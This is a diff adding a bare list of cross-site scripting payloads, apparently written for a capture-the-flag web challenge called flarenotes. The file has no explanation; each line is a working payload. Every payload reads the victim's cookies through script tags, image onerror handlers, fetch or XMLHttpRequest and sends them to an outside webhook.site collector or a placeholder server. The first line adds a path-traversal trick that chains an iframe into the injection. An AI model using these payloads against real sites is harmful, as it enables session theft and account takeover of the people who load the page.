@@ -1,0 +1,31 @@
+https://flarenotes.vsc.tf/view?user=../view?user=<iframe src='https://flarenotes.vsc.tf' ></iframe><img src=x onerror=this.src='https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15/?'%252Bdocument.cookie%3B>
+
+
+
+<img src=x onerror=error()><script>function error(){fetch('https://flarenotes.vsc.tf', {method: 'GET'}).then(response => {const cookies = response.headers.getAll('set-cookie');fetch('https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15', {method: 'POST', body: cookies});});} </script>
+
+
+
+<script>document.location.href = 'https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15?cookie='%252Bdocument.cookie%3B</script>
+
+
+<img src=x onerror=this.src='https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15/?'%252Bdocument.cookie%3B>
+
+<script>document.location.href = 'https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15?cookie='%252Bdocument.cookie%3B</script>
+
+
+
+<script>fetch('https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15', {method: 'POST', body: document.cookie});var xhttp=new XMLHttpRequest();xhttp.open('GET', 'https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15/?c='%2Bdocument.cookie, true);xhttp.send();</script>
+
+<img src=x onerror=this.src="https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15/?c="%252Bdocument.cookie>
+
+<script>location.href = 'https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15?cookie='+document.cookie</script>
+<script>fetch('https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15', {method: 'POST', body: document.cookie});</script>
+<img src=x onerror="location.href='https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15/?c='+ document.cookie">
+
+<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
+
+<script>document.location.href = 'https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15?cookie='%252Bdocument.cookie</script>
+
+
+<img src=x onerror=error()><script>function error(){fetch('https://flarenotes.vsc.tf', {method: 'GET'}).then(response => {const cookies = response.headers.getAll('set-cookie');fetch('https://webhook.site/fe755287-0f22-4f73-9c56-5ee716607f15', {method: 'POST', body: cookies});});} </script>
